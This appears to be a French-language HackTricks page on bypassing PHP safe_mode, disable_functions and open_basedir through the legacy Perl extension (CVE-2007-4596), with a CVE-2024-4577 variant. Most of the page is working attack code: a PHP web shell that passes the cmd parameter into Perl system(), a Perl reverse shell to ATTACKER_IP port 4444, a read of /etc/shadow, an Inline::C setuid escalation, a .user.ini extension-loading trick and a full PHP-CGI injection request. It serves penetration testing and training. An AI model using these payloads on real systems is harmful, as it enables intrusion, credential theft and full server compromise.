# PHP Perl Extension Safe_mode Bypass Exploit

{{#include ../../../../banners/hacktricks-training.md}}

## Contexte

L'issue suivie sous **CVE-2007-4596** provient de l'extension PHP legacy `perl`, qui embarque un interpréteur Perl complet sans respecter les contrôles `safe_mode`, `disable_functions`, ou `open_basedir` de PHP. Tout worker PHP qui charge `extension=perl.so` obtient un `eval` Perl sans restriction, donc l'exécution de commandes reste triviale même lorsque toutes les primitives classiques de création de processus PHP sont bloquées. Bien que `safe_mode` ait disparu dans PHP 5.4, de nombreuses stacks d'hébergement mutualisé obsolètes et des labs vulnérables le distribuent encore, donc ce contournement reste utile lorsque vous tombez sur des panneaux de contrôle legacy.

## Compatibilité & statut du packaging (2025)

* La dernière release PECL (`perl-1.0.1`, 2013) cible PHP ≥5.0 ; PHP 8+ échoue généralement car les API Zend ont changé.
* PECL est en train d'être supplanté par PIE, mais les stacks plus anciennes distribuent encore PECL/pear. Utilisez le flux ci-dessous sur des cibles PHP 5/7 ; sur des PHP plus récents prévoyez de rétrograder ou de passer à un autre vecteur d'injection (par ex., userland FFI).

## Construction d'un environnement testable en 2025

* Récupérez `perl-1.0.1` depuis PECL, compilez-le pour la branche PHP que vous comptez attaquer, et chargez-le globalement (`php.ini`) ou via `dl()` (si autorisé).
* Recette rapide pour un lab basé sur Debian :
```bash
sudo apt install php5.6 php5.6-dev php-pear build-essential
sudo pecl install perl-1.0.1
echo "extension=perl.so" | sudo tee /etc/php/5.6/mods-available/perl.ini
sudo phpenmod perl && sudo systemctl restart apache2
```
* Lors de l'exploitation, confirmez la disponibilité avec `var_dump(extension_loaded('perl'));` ou `print_r(get_loaded_extensions());`. Si absent, cherchez `perl.so` ou abusez des entrées `php.ini`/`.user.ini` inscriptibles pour forcer son chargement.
* Parce que l'interpréteur vit à l'intérieur du worker PHP, aucun binaire externe n'est nécessaire — les filtres de sortie réseau ou les listes noires `proc_open` n'ont pas d'importance.

### Chaîne de build sur l'hôte lorsque phpize est accessible

Si `phpize` et build-essential sont présents sur l'hôte compromis, vous pouvez compiler et déposer `perl.so` sans invoquer le shell de l'OS:
```bash
# grab the tarball from PECL
wget https://pecl.php.net/get/perl-1.0.1.tgz
tar xvf perl-1.0.1.tgz && cd perl-1.0.1
phpize
./configure --with-perl=/usr/bin/perl --with-php-config=$(php -r 'echo PHP_BINARY;')-config
make -j$(nproc)
cp modules/perl.so /tmp/perl.so
# then load with a .user.ini in the webroot if main php.ini is read-only
echo "extension=/tmp/perl.so" > /var/www/html/.user.ini
```
Si `open_basedir` est appliqué, assurez-vous que le `.user.ini` et le `.so` déposés se trouvent dans un chemin autorisé ; la directive `extension=` est toujours prise en compte à l'intérieur du basedir. Le flux de compilation suit le manuel PHP pour la construction des extensions PECL.

## Original PoC (NetJackal)

Tiré de [http://blog.safebuff.com/2016/05/06/disable-functions-bypass/](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/), toujours utile pour confirmer que l'extension répond à `eval`:
```php
<?php
if(!extension_loaded('perl'))die('perl extension is not loaded');
if(!isset($_GET))$_GET=&$HTTP_GET_VARS;
if(empty($_GET['cmd']))$_GET['cmd']=(strtoupper(substr(PHP_OS,0,3))=='WIN')?'dir':'ls';
$perl=new perl();
echo "<textarea rows='25' cols='75'>";
$perl->eval("system('".$_GET['cmd']."')");
echo "&lt;/textarea&gt;";
$_GET['cmd']=htmlspecialchars($_GET['cmd']);
echo "<br><form>CMD: <input type=text name=cmd value='".$_GET['cmd']."' size=25></form>";
?>
```
## Améliorations modernes des Payloads

### 1. Full TTY over TCP

L'interpréteur embarqué peut charger `IO::Socket` même si `/usr/bin/perl` est bloqué:
```php
$perl = new perl();
$payload = <<<'PL'
use IO::Socket::INET;
my $c = IO::Socket::INET->new(PeerHost=>'ATTACKER_IP',PeerPort=>4444,Proto=>'tcp');
open STDIN,  '<&', $c;
open STDOUT, '>&', $c;
open STDERR, '>&', $c;
exec('/bin/sh -i');
PL;
$perl->eval($payload);
```
### 2. File-System Escape Même avec `open_basedir`

Perl ignore la directive `open_basedir` de PHP, donc vous pouvez lire des fichiers arbitraires :
```php
$perl = new perl();
$perl->eval('open(F,"/etc/shadow") || die $!; print while <F>; close F;');
```
Redirigez la sortie via `IO::Socket::INET` ou `Net::HTTP` pour exfiltrer des données sans toucher aux descripteurs gérés par PHP.

### 3. Compilation inline pour Privilege Escalation

Si `Inline::C` existe au niveau système, compilez des helpers dans la requête sans dépendre de `ffi` ou `pcntl` de PHP :
```php
$perl = new perl();
$perl->eval(<<<'PL'
use Inline C => 'DATA';
print escalate();
__DATA__
__C__
char* escalate(){ setuid(0); system("/bin/bash -c 'id; cat /root/flag'"); return ""; }
PL
);
```
### 4. Living-off-the-Land Enumeration

Considérez Perl comme un toolkit LOLBAS — p. ex., extraire les DSN MySQL même si `mysqli` est absent:
```php
$perl = new perl();
$perl->eval('use DBI; @dbs = DBI->data_sources("mysql"); print join("\n", @dbs);');
```
## 2024+ Abus: Chargement de `perl.so` via PHP-CGI Argument Injection (CVE-2024-4577)

Sur des installations Windows qui exposent encore **PHP-CGI**, la régression 2024 argument-injection (CVE-2024-4577) permet de passer des options arbitraires `-d` à l'interpréteur. Cela signifie que vous pouvez charger l'extension Perl même lorsque `dl()` est désactivée et que `php.ini` est en lecture seule :

* Construire ou téléverser un compatible `perl.dll`/`perl.so` dans un chemin écrivable par le web (e.g., `C:\xampp\htdocs\temp\perl.dll`).
* Envoyer une seule requête HTTP qui injecte `-d extension=C:\\xampp\\htdocs\\temp\\perl.dll` et, dans le même corps de requête, une Perl-backed payload:
```http
POST /?%ADd+extension=C:\\xampp\\htdocs\\temp\\perl.dll+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: victim
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

<?php $p=new perl(); $p->eval("system('whoami && hostname')"); ?>
```
Parce que le worker PHP incruste maintenant Perl avant de lire le body, tous les contrôles classiques `disable_functions`/`open_basedir` sont contournés. Cela fonctionne sur les stacks Windows/CGI vulnérables jusqu'au correctif (PHP 8.1.29/8.2.20/8.3.8 et versions ultérieures corrigent la régression). Si `open_basedir` bloque le chemin du DLL, déposez d'abord le fichier dans le répertoire de base autorisé ou exploitez un chemin de DLL world-readable existant fourni par XAMPP.

## References

- [CVE-2007-4596 summary and timeline](https://www.cvedetails.com/cve/CVE-2007-4596/)
- [PECL perl extension package information](https://pecl.php.net/package/perl)
- [PHP Manual: building PECL extensions with phpize](https://www.php.net/manual/en/install.pecl.phpize.php)
- [PECL homepage announcing PIE replacement](https://pecl.php.net/)
- [CVE-2024-4577 PHP-CGI argument injection PoC](https://github.com/AlperenY-cs/CVE-2024-4577)
- [Plesk advisory summarizing CVE-2024-4577 impact and patched versions](https://support.plesk.com/hc/en-us/articles/24020385443351-Security-Alert-CVE-2024-4577-PHP-CGI-Argument-Injection-Vulnerability)

{{#include ../../../../banners/hacktricks-training.md}}
